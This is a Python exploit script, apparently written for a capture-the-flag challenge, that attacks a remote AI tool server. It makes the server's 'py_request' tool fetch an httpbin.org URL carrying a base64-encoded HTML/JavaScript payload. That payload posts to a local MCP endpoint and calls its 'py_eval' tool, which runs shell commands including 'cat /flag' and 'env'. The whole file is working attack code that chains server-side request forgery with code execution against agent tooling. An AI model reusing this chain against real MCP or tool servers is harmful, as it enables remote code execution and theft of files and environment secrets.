import requests
import json
import base64
import time

BASE_URL = "http://cloud-big.hgame.vidar.club:31704"

def execute_tool(name, arguments):
    url = f"{BASE_URL}/execute_tool"
    headers = {'Content-Type': 'application/json'}
    data = {'name': name, 'arguments': arguments}
    print(f"DEBUG: sending request to {url}", flush=True)
    try:
        response = requests.post(url, headers=headers, json=data, timeout=30)
        try:
            return response.json()
        except:
             return {"status": response.status_code, "text": response.text}
    except Exception as e:
        return {"error": str(e)}

def generate_payload_url(cmd):
    # Python code to be executed by py_eval
    py_code = f"""
import os
try:
    output = os.popen("{cmd}").read()
except Exception as e:
    output = str(e)
"""
    # Escape for JSON string
    py_code_escaped = py_code.replace('"', '\\"').replace('\n', '\\n')
    
    # HTML + JS Payload
    html = f"""
<!DOCTYPE html>
<html>
<body>
<script>
    fetch('http://127.0.0.1:8001/mcp', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{
            "jsonrpc": "2.0",
            "id": 1,
            "params": {{
                "name": "py_eval",
                "arguments": {{
                    "code": "{py_code_escaped}"
                }}
            }}
        }})
    }})
    .then(response => response.json())
    .then(data => {{
        document.body.innerText = JSON.stringify(data);
    }})
    .catch(error => {{
        document.body.innerText = 'Error: ' + error;
    }});
</script>
</body>
</html>
"""
    # Base64 encode the HTML
    # Ensure no '/' or '+' in base64 string to avoid URL path issues
    counter = 0
    while True:
        b64_bytes = base64.b64encode(html.encode())
        b64_str = b64_bytes.decode()
        if '/' not in b64_str and '+' not in b64_str:
            break
        html += " " # Add padding
        counter += 1
        if counter > 5000:
            print("Failed to find suitable padding", flush=True)
            break

    return f"http://httpbin.org/base64/{b64_str}"

if __name__ == "__main__":
    with open("exploit.log", "w") as f:
        f.write("Starting exploit...\n")
    
    # Commands to try
    cmds = ["ls /", "cat /flag", "env"]
    
    for cmd in cmds:
        with open("exploit.log", "a") as f:
            f.write(f"[*] Trying command: {cmd}\n")
        
        target_url = generate_payload_url(cmd)
        
        with open("exploit.log", "a") as f:
            f.write(f"[*] Target URL: {target_url[:50]}...\n")
        
        res = execute_tool("py_request", {"url": target_url})
        
        with open("exploit.log", "a") as f:
            f.write(f"[*] Result: {res}\n")